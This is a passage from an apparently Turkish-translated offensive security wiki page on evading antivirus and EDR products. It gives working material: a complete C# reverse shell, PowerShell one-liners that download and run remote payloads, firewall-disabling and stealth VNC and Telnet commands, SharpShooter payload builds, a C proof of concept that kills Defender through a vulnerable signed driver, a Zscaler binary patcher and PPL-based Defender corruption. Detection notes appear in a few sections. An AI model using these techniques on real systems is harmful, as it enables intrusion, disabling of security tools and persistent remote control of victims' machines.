AMSI'nin devre dışı bırakıldığı (baypas edildiği) gibi, kullanıcı alanı sürecinin **`EtwEventWrite`** fonksiyonunun olayları kaydetmeden hemen dönmesini sağlamak da mümkündür. Bu, fonksiyonun bellekte patchlenmesiyle yapılır; fonksiyon hemen döner ve böylece o süreç için ETW günlüklemesi etkili bir şekilde devre dışı bırakılır.

Daha fazla bilgi için bakabilirsiniz: **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) ve [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## C# Assembly Reflection

C# ikili dosyalarının belleğe yüklenmesi uzun zamandır biliniyor ve AV tarafından yakalanmadan post-exploitation araçlarınızı çalıştırmanın hâlâ çok iyi bir yoludur.

Payload doğrudan diske dokunmadan belleğe yükleneceği için, tüm süreç için yalnızca AMSI'yi patchlemeyi düşünmemiz gerekecektir.

Çoğu C2 framework'ü (sliver, Covenant, metasploit, CobaltStrike, Havoc, vb.) zaten C# assembly'lerini doğrudan bellekte çalıştırma yeteneği sağlar, ancak bunu yapmanın farklı yolları vardır:

- **Fork\&Run**

Bu yöntem, **yeni bir feda süreci spawn etmeyi**, post-exploitation kötü amaçlı kodunuzu o yeni sürece inject etmeyi, kötü amaçlı kodunuzu çalıştırmayı ve iş bitince yeni süreci sonlandırmayı içerir. Bunun hem avantajları hem de dezavantajları vardır. Fork and run yönteminin avantajı, yürütmenin Beacon implant sürecimizin **dışında** gerçekleşmesidir. Bu, post-exploitation eylemlerimizde bir şeyler ters giderse veya yakalanırsa, implantımızın hayatta kalma olasılığının **çok daha yüksek** olduğu anlamına gelir. Dezavantajı ise, **Behavioural Detections** tarafından yakalanma şansınızın **daha yüksek** olmasıdır.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Bu yöntem, post-exploitation kötü amaçlı kodu **kendi sürecinin içine inject etmeyi** kapsar. Bu sayede yeni bir süreç oluşturup AV tarafından taranmasını gerektirmezsiniz, fakat payload'unuzun yürütülmesinde bir sorun çıkarsa, beacon'ınızı kaybetme şansınızın **çok daha yüksek** olması gibi bir dezavantaj vardır çünkü süreç çökebilir.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly yükleme hakkında daha fazla okumak isterseniz, şu makaleye bakabilirsiniz: [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) ve onların InlineExecute-Assembly BOF'u ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))

C# Assembly'lerini ayrıca PowerShell üzerinden de yükleyebilirsiniz; bakınız [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) ve [S3cur3th1sSh1t'in videosu](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Diğer Programlama Dillerini Kullanma

As proposed in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), başka dilleri kullanarak kötü amaçlı kod çalıştırmak mümkündür; bunun için ele geçirilmiş makinenin **Attacker Controlled SMB share**'e kurulu interpreter ortamına erişimi olması gerekir.

Interpreter Binaries ve SMB share üzerindeki ortama erişim verildiğinde, ele geçirilmiş makinenin belleği içinde bu dillerde **keyfi kod çalıştırabilirsiniz**.

Repo belirtir: Defender hâlâ scriptleri tarıyor ama Go, Java, PHP vb. kullanarak **statik imzaları atlatmada daha fazla esneklik** elde ediyoruz. Bu dillerde rastgele obfuscation yapılmamış reverse shell script'leri ile yapılan testler başarılı olduğunu göstermiştir.

## TokenStomping

Token stomping, bir saldırganın **access token** veya EDR ya da AV gibi bir güvenlik ürünü üzerinde manipülasyon yapmasına olanak sağlayan bir tekniktir; bu sayede sürecin ölmesini engellerken, sürecin kötü niyetli etkinlikleri kontrol etme yetkisini azaltabilirsiniz.

Bunu önlemek için Windows, güvenlik süreçlerinin token'ları üzerinde dış süreçlerin handle almasını **engelleyebilir**.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Güvenilir Yazılım Kullanımı

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)’ta açıklandığı gibi, bir hedef PC'ye Chrome Remote Desktop kurup onu ele geçirip kalıcılık sağlamak oldukça kolaydır:
1. https://remotedesktop.google.com/ adresinden indirin, "Set up via SSH"e tıklayın ve ardından Windows için MSI dosyasını indirmek üzere MSI dosyasına tıklayın.
2. Kurulumu hedefte sessizce çalıştırın (yönetici gerekli): `msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop sayfasına geri dönün ve Next'e tıklayın. Sihirbaz sizden yetki isteyecektir; devam etmek için Authorize butonuna tıklayın.
4. Verilen parametreyi bazı ayarlamalarla çalıştırın: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (Not: pin parametresi GUI kullanmadan pini ayarlamaya izin verir).

## Advanced Evasion

Evasion çok karmaşık bir konudur; bazen tek bir sistemde pek çok farklı telemetri kaynağını göz önünde bulundurmanız gerekir, bu yüzden olgun ortamlarda tamamen tespit edilmeden kalmak neredeyse imkansızdır.

Karşılaştığınız her ortamın kendine özgü güçlü ve zayıf yönleri olacaktır.

Daha gelişmiş Evasion tekniklerine giriş yapmak için [@ATTL4S](https://twitter.com/DaniLJ94)'in bu konuşmasını izlemenizi şiddetle tavsiye ederim.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Bu, [@mariuszbit](https://twitter.com/mariuszbit)'in Derinlemesine Evasion hakkında başka harika bir konuşmasıdır.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) aracını kullanarak, Defender'ın hangi kısmı kötü amaçlı olarak bulduğunu öğrenene kadar ikilinin parçalarını **kaldırabilirsiniz** ve hangi kısmın Defender tarafından kötü amaçlı bulunduğunu size ayırarak gösterir.\
Aynı şeyi yapan başka bir araç da [**avred**](https://github.com/dobin/avred) olup, servisi açık web üzerinden sunar: [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Windows10'a kadar, tüm Windows sürümleri (yönetici olarak) kurabileceğiniz bir **Telnet server** ile geliyordu:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Sistem başlatıldığında onun **başlamasını** sağla ve şimdi onu **çalıştır**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Telnet portunu değiştir** (stealth) ve firewall'ı devre dışı bırak:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

İndirin: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (setup değil, bin downloads'ı tercih edin)

**ON THE HOST**: _**winvnc.exe**_ dosyasını çalıştırın ve sunucuyu yapılandırın:

- _Disable TrayIcon_ seçeneğini etkinleştirin
- _VNC Password_ alanına bir parola belirleyin
- _View-Only Password_ alanına bir parola belirleyin

Sonra, ikili dosya _**winvnc.exe**_ ve yeni oluşturulan dosya _**UltraVNC.ini**_ dosyasını **victim** içine taşıyın

#### **Reverse connection**

**attacker** kendi **host**'unda `vncviewer.exe -listen 5900` ikili dosyasını çalıştırmalı; böylece reverse **VNC connection** yakalamaya hazır hale gelir. Ardından, **victim** içinde: winvnc daemon'ını `winvnc.exe -run` ile başlatın ve `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` komutunu çalıştırın

**UYARI:** Stealth'i korumak için bazı şeyleri yapmamalısınız

- `winvnc` zaten çalışıyorsa başlatmayın, aksi halde bir [popup](https://i.imgur.com/1SROTTl.png) tetiklersiniz. Çalışıp çalışmadığını `tasklist | findstr winvnc` ile kontrol edin
- Aynı dizinde `UltraVNC.ini` olmadan `winvnc` başlatmayın, aksi halde [yapılandırma penceresi](https://i.imgur.com/rfMQWcf.png) açılacaktır
- Yardım için `winvnc -h` çalıştırmayın, aksi halde bir [popup](https://i.imgur.com/oc18wcu.png) tetiklenir

### GreatSCT

İndirin: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCT'nin içinde:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Şimdi **lister'ı başlatın** `msfconsole -r file.rc` ile ve **xml payload**'ı şu komutla **çalıştırın:**
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Mevcut defender işlemi çok hızlı sonlandıracaktır.**

### Kendi reverse shell'imizi derleme

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### İlk C# Revershell

Bunu şu komutla derleyin:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Şununla kullanın:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# derleyicisini kullanma
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Otomatik indirme ve yürütme:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscator listesi: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python kullanarak build injectors örneği:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Diğer araçlar
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Daha Fazla

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603, fidye yazılımı bırakmadan önce uç nokta korumalarını devre dışı bırakmak için **Antivirus Terminator** adlı küçük bir konsol aracını kullandı. Araç, **kendi savunmasız ancak *imzalı* sürücüsünü** getirir ve Protected-Process-Light (PPL) AV servislerinin bile engelleyemediği ayrıcalıklı çekirdek işlemleri gerçekleştirmek için bunu suistimal eder.

Önemli çıkarımlar
1. **İmzalı sürücü**: Diske bırakılan dosya `ServiceMouse.sys` iken, ikili dosya Antiy Labs’in “System In-Depth Analysis Toolkit” içindeki yasal olarak imzalanmış `AToolsKrnl64.sys` sürücüsüdür. Sürücü geçerli bir Microsoft imzası taşıdığı için Driver-Signature-Enforcement (DSE) etkin olsa bile yüklenir.
2. **Servis kurulumu**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
İlk satır sürücüyü bir kernel servisi olarak kaydeder ve ikincisi başlatarak `\\.\ServiceMouse`'ın kullanıcı alanından erişilebilir olmasını sağlar.
3. **Sürücünün açığa çıkardığı IOCTL'ler**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID ile rastgele bir süreci sonlandırma (Defender/EDR servislerini sonlandırmak için kullanılır) |
| `0x990000D0` | Diskteki rastgele bir dosyayı silme |
| `0x990001D0` | Sürücüyü boşaltma ve servisi kaldırma |

Minimal C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Neden işe yarıyor**: BYOVD kullanıcı modu korumalarını tamamen atlar; çekirdekte çalışan kod, *korumalı* süreçleri açabilir, sonlandırabilir veya PPL/PP, ELAM veya diğer sertleştirme özelliklerine bakılmaksızın çekirdek nesneleriyle müdahale edebilir.

Tespit / Hafifletme
• Microsoft'un savunmasız sürücü engelleme listesini (`HVCI`, `Smart App Control`) etkinleştirin, böylece Windows `AToolsKrnl64.sys` yüklemeyi reddeder.  
• Yeni *kernel* servislerinin oluşturulmasını izleyin ve bir sürücü dünyaya yazılabilir bir dizinden yüklendiğinde veya izin listesinde bulunmadığında alarm verin.  
• Özelleştirilmiş aygıt nesnelerine yönelik kullanıcı modu handle'ları ve bunu takiben şüpheli `DeviceIoControl` çağrılarının olup olmadığını izleyin.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’ın **Client Connector**'ı cihaz-posture kurallarını yerelde uygular ve sonuçları diğer bileşenlere iletmek için Windows RPC'ye dayanır. Tam bir bypass'ı mümkün kılan iki zayıf tasarım tercihi vardır:

1. Posture değerlendirmesi **tamamen istemci tarafında** gerçekleşir (sunucuya bir boolean gönderilir).  
2. İç RPC uç noktaları, bağlanan yürütülebilir dosyanın yalnızca **Zscaler tarafından imzalanmış** olduğunu doğrular (`WinVerifyTrust`).

Diskte imzalanmış dört binary'yi **patch'leyerek** her iki mekanizma da nötralize edilebilir:

| Binary | Yamalanan orijinal mantık | Sonuç |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Her zaman `1` döndürür, böylece her kontrol uyumlu olur |
| `ZSAService.exe` | Indirect call to `WinVerifyTrust` | NOP-ed ⇒ herhangi bir (hatta imzasız) process RPC pipe'larına bağlanabilir |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` ile değiştirildi |
| `ZSATunnel.exe` | Integrity checks on the tunnel | Kısa devre yapıldı |

Minimal patcher kesiti:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Orijinal dosyaları değiştirip servis yığını yeniden başlattıktan sonra:

* **Tüm** posture kontrolleri **yeşil/uyumlu** olarak görüntülenir.
* İmzalanmamış veya değiştirilmiş ikili dosyalar adlandırılmış pipe RPC uç noktalarını açabilir (ör. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* İhlal edilmiş host, Zscaler politikalarıyla tanımlanan iç ağa sınırsız erişim kazanır.

Bu vaka çalışması, yalnızca istemci taraflı güven kararlarının ve basit imza kontrollerinin birkaç byte patch ile nasıl alt edilebileceğini gösterir.

## Protected Process Light (PPL) Kötüye Kullanımı ile LOLBINs kullanarak AV/EDR'yi Değiştirme

Protected Process Light (PPL), yalnızca eşit veya daha yüksek korumalı süreçlerin birbirlerine müdahale edebilmesini sağlamak için bir signer/seviye hiyerarşisi uygular. Saldırı açısından, eğer meşru şekilde PPL-etkin bir binary başlatabiliyor ve argümanlarını kontrol edebiliyorsanız, zararsız bir işlevselliği (ör. kayıt tutma) AV/EDR tarafından kullanılan korumalı dizinlere karşı kısıtlı, PPL-destekli bir yazma ilkeline dönüştürebilirsiniz.

Bir sürecin PPL olarak çalışmasını sağlayanlar
- Hedef EXE (ve yüklenen DLL'ler) PPL-özellikli bir EKU ile imzalanmış olmalıdır.
- Süreç CreateProcess ile şu flag'ler kullanılarak oluşturulmalıdır: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Binary'nin imzalayıcısıyla eşleşen uyumlu bir koruma seviyesi talep edilmelidir (ör. anti-malware imzalayıcıları için `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`, Windows imzalayıcıları için `PROTECTION_LEVEL_WINDOWS`). Yanlış seviyeler oluşturma sırasında başarısız olur.

Ayrıca PP/PPL ve LSASS korumasına daha geniş bir giriş için bakınız:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher araçları
- Açık kaynak yardımcı: CreateProcessAsPPL (koruma seviyesini seçer ve argümanları hedef EXE'ye iletir):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Kullanım deseni:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- The signed system binary `C:\Windows\System32\ClipUp.exe` kendini başlatır ve çağıranın belirttiği bir yola günlük dosyası yazmak için bir parametre alır.
- When launched as a PPL process, the file write occurs with PPL backing.
- ClipUp boşluk içeren yolları çözümleyemez; normalde korumalı konumlara işaret etmek için 8.3 kısa yol adlarını kullanın.

8.3 kısa yol yardımcıları
- Kısa isimleri listele: `dir /x` in each parent directory.
- CMD'de kısa yolu türet: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Launch the PPL-capable LOLBIN (ClipUp) with `CREATE_PROTECTED_PROCESS` using a launcher (e.g., CreateProcessAsPPL).
2) Pass the ClipUp log-path argument to force a file creation in a protected AV directory (e.g., Defender Platform). Use 8.3 short names if needed.
3) If the target binary is normally open/locked by the AV while running (e.g., MsMpEng.exe), schedule the write at boot before the AV starts by installing an auto-start service that reliably runs earlier. Validate boot ordering with Process Monitor (boot logging).
4) On reboot the PPL-backed write happens before the AV locks its binaries, corrupting the target file and preventing startup.

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notlar ve kısıtlamalar
- ClipUp'un yazdığı içeriği yerleşim dışında kontrol edemezsiniz; bu primitif hassas içerik enjeksiyonundan ziyade bozulmaya (corruption) uygundur.
- Bir hizmeti kurmak/başlatmak ve bir yeniden başlatma penceresi için yerel admin/SYSTEM gerektirir.
- Zamanlama kritik: hedef açık olmamalı; önyükleme zamanı yürütme dosya kilitlerinden kaçınır.

Tespitler
- `ClipUp.exe`'in sıra dışı argümanlarla, özellikle standart olmayan başlatıcıların parent'ı olduğu durumlarda, önyükleme etrafında process oluşturulması.
- Şüpheli ikilileri otomatik başlatacak şekilde yapılandırılmış yeni servisler ve Defender/AV'den sürekli önce başlayan servisler. Defender başlatma hatalarından önceki servis oluşturma/değişikliklerini araştırın.
- Defender ikilileri/Platform dizinleri üzerinde dosya bütünlüğü izlemesi; protected-process flag'ine sahip süreçler tarafından beklenmeyen dosya oluşturma/değişiklikleri.
- ETW/EDR telemetri: `CREATE_PROTECTED_PROCESS` ile oluşturulan süreçleri ve non-AV ikililer tarafından anormal PPL seviyesi kullanımını arayın.

Önlemler
- WDAC/Code Integrity: hangi imzalı ikililerin PPL olarak çalışabileceğini ve hangi parent'lar altında çalışabileceğini kısıtlayın; meşru bağlamlar dışında ClipUp çağrılarını engelleyin.
- Servis hijyeni: otomatik başlatmalı servislerin oluşturulması/değiştirilmesini kısıtlayın ve başlangıç sırası manipülasyonunu izleyin.
- Defender tamper protection ve early-launch korumalarının etkin olduğundan emin olun; ikili bozulmasına işaret eden başlangıç hatalarını araştırın.
- Güvenlik araçlarını barındıran hacimlerde uyumluysa 8.3 kısa-ad üretimini devre dışı bırakmayı düşünün (ortamınızla uyumluysa, kapsamlı test yapın).

PPL ve araçlar için referanslar
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
